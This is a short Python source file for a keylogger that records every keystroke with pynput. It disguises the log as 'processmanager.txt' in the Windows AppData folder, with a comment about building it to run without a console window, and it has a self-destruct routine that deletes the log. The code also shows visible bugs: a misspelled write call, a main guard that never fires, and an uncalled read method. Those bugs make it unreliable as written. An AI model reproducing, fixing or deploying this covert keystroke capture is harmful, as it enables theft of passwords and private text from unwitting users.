import os, time, threading
from pynput.keyboard import Listener

class Keylogger():
    keys = []
    count = 0
    flag = 0
    # path = os.environ['appdata'] + '\\processmanager.txt' #for windows | python3 key.py --onefile --noconsole, cd AppData, cd Roaming, dir, type processmanager.txt
    path = 'processmanager.txt' #for linux

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []
    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()
        
    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' backspace ')
                elif k.find('enter') > 0:
                    f.wrinte('\n')
                elif k.find('shift') > 0:
                    f.write(' shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)
    
    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)
                
    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == 'main':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_logs
        print(logs)
        # keylog.self_destruct()
    t.join()
